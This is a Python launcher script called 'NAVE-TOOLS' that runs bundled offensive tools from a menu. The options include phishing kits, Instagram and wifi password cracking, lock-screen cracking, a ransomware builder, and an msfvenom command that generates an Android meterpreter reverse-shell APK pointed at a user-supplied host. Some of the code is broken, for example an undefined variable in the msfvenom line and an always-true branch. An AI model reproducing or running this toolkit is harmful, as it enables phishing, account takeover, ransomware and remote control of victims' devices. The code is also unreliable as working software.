# import requirements
import os
import time
import datetime

r = "\033[91m"
y = "\033[93m"
v = "\033[94m"
g = "\033[92m"

# Create a banner NAVE
print ("\033[92m")
def banner():
    os.system("clear ")
    print("""
                 ████          ██     ██      ██        ██   ██████  
                 ████         ██     ██ ██     ██      ██    ██           
                 ██ ██       ██      ██  ██    ██      ██    ██          
                 ██  ██     ██      ██   ██     ██    ██     ████        
                 ██   ██    ██      ████████    ██    ██    ██
                 ██    ██  ██      ██     ██     ██  ██      ██
                 ██     ████       ██      ██    ██  ██      ██       
                 ██     ██        ██       ██      ██        ██████   

""")

# getting a user name
banner()
name = input("What can i call you ? :")

# Create a Description
banner()
print (" _________________________________________________________________________________")
print ("|--------------------------- author :  NAVE ---------------------------------------| ")
print ("|-------------------------- TOOL NAME : NAVE-TOOLS --------------------------------| ")
print ("|-------------------- THIS TOOL FOR ONLY EDUCATIONAL PURPOSES ---------------------| ")
print ("—————————————————————————————————————————————————————————————————————————————————")
print (" ")
print("Welcome to NAVE,",name)

def display_time():
        now = datetime.datetime.now()
        print(now.strftime("%Y-%m-%d %H:%M:%S"), end='\r')
        time.sleep(1)

# Create a MENU OPTIONS
def display_menu():
    print("Date and Time")
    print(display_time())
    print(g+ "______________________________________________________________ ")
    print("| Tools options:                                             | ")
    print("| 1.",y +" Password generator",r +"              (CUPP)               " ,g+ "|" )
    print(g+"| 2.",y+" Phishing attacks",r+"                (zphisher)           " ,g+ "|" )         
    print(g+"| 3.",y+" Start Mtasploit",r+"                 (msfconsole)         " ,g+ "|" )         
    print(g+"| 4.",y+"Jump Location",r+"                    (Auto tor ip changer)" ,g+ "|" )         
    print(g+"| 5.",y+" Advanced Hack Via Wifi",r+"          (Phonesploit-pro)    " ,g+ "|" )         
    print(g+"| 6.",y+" Kali linux root in Terminal",r+"     (Kali)               " ,g+ "|" )         
    print(g+"| 7.",y+" Instant Phishing",r+"                (Lord Phish)         " ,g+ "|" )         
    print(g+"| 8.",y+" The Lazy Script Powerful Tool",r+"   (Lazyscrip)          " ,g+ "|" )         
    print(g+"| 9.",y+" Instagram information gathering",r+" (OSINT)              " ,g+ "|" )         
    print(g+"| 10.",y+" Web and Web applications Tools",r+" (pureblood)          " ,g+ "|" )         
    print(g+"| 11.",y+" Hack instagram account",r+"         (instainsane)        " ,g+ "|" )         
    print(g+"| 12.",y+" Password generator Best tool",r+"   (W-list-gen)         " ,g+ "|" )         
    print(g+"| 13.",y+" URL Hider",r+"                      (IHA089)             " ,g+ "|" )         
    print(g+"| 14.",y+" Hack instagram account V2",r+"      (hackinsagram)       " ,g+ "|" )         
    print(g+"| 15.",y+" Wifi password attack",r+"           (wifite)             " ,g+ "|" )         
    print(g+"| 16.",y+" Calculator",r+"                     (NS-HACK777)         " ,g+ "|" )         
    print(g+"| 17.",y+" URL Hider V2",r+"                   (FACAD1NG)           " ,g+ "|" )         
    print(g+"| 18.",y+" Lock Screen Password Cracking",r+"  (CILOCKS)            " ,g+ "|" )         
    print(g+"| 19.",y+" Create a ransomware",r+"            (SARA)               " ,g+ "|" )         
    print(g+"| 20.",y+" Create a malware (apk)",r+"         (METASPLOIT)         " ,g+ "|" )         
    print(g+"|  m.",y+" more tools                                           " ,g+ "|" )
    print(g+"| n.",y+" Exit                                                 " ,g+ "|" )
    print("—————————————————————————————————————————————————————————————|",g+"" )
print("")
print("")

# Get choice from script user
def get_user_choice():
    choice = input("Enter your choice: ")
    return choice

# Excute choices
def main():
    display_menu()
    choice = get_user_choice()

# choice 1 password generator
    if choice == '1':
      os.system("clear")
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("python3 cupp/cupp.py -i ")

# choice 2 phishing attacks
    elif choice == '2':
      os.system("clear")
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("cd zphisher ")
      os.system("chmod +x zphisher/zphisher.sh ")
      os.system("bash zphisher/zphisher.sh ")

# choice 3 start metaspoloit
    elif choice == '3':
      os.system("clear" )
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("msfconsole ")

# choice 4 jump location
    elif choice == '4':
      os.system("clear ")
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("python3 Auto_Tor_IP_changer/autoTOR.py ")

# choice 5 Hack via wifi
    elif choice == '5':
      os.system("clear ")
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("python3 PhoneSploit-Pro/phonesploitpro.py ")

# choice 6 start kali linux
    elif choice == '6':
      os.system("clear")
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("bash start-kali.sh ")

# choice 7 Instant phishing
    elif choice == '7':
      os.system("clear ")
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("bash LordPhish/setup.sh ")
      os.system("bash LordPhish/lord.sh ")

# choice 8 The lazy script powerful tool
    elif choice == '8':
      os.system("clear ")
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("bash lscript/l ")

# choice 9 Instagram information gathering by osint
    elif choice == '9':
      os.system("clear ")
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("pip3 install instaloader ")
      os.system("python3 IG-OSINT-V2/ig.py ")

# choice 10 pureblood web and webapplication tool
    elif choice == '10':
      os.system("clear ")
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("python3 https-github.com-cr4shcod3-pureblood/pureblood.py ")

# choice 11 instagram password cracking
    elif choice == '11':
      os.system("clear ")
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("bash instainsane/instainsane.sh ")

# choice 12 best password generator
    elif choice == '12':
      os.system("clear ")
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("python3 W-list-gen/wlistgen.py ")

# choice 13 URL Hider
    elif choice == '13':
      os.system("clear ")
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("python3 URLHider/URLHider.py ")

# choice 14 instagram password cracking
    elif choice == '14':
      os.system("clear ")
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("bash hackinsagram/haxter.sh ")

# choice 15 wifi password cracking
    elif choice == '15':
      os.system("clear ")
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("wifite ")

# choice 16 calculator
    elif choice == '16':
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("python3 calculator.py ")

# choice 17 URL Hider v2
    elif choice == '17':
      os.system("clear")
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("python3 Facad1ng/facad1ng.py ")

# choice 18 Lock Screen password cracking
    elif choice == '18':
      os.system("clear")
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("bash CiLocks/cilocks")

# choice 19 create a ransomware
    elif choice == '19':
      os.system("clear")
      banner()
      time.sleep(1)
      os.system("clear")
      os.system("python3 SARA/install.sh ")
      os.system("python3 SARA/sara.py ")

# choice 20 create a malware apk
    elif choice == '20':
     banner()
     time.sleep(1)
     os.system("clear")
     banner()
     ip = input(y+"Enter your ip adreess to create a malware : ")
     lport = input(g+"Enter your port number 4 digit : ")
     print("Creating a malware please wait.........")
     os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={lpor} > test.apk" )

# choice m more tools
    elif choice == 'm':
      banner()
      time.sleep(1)
      os.system("clear")
      os.system("python3 nave-toolsv2.py")

# choice ns to exit
    elif choice == 'n':
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("exit ")

# press any key return this tool
    elif 'press any key':
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("python3 nave-tools.py ")


# press other wrong key return this tools
    else:
      banner()
      time.sleep(1)
      os.system("clear ")
      os.system("python3 nave-tools.py ")



if __name__ == "__main__":

     main()
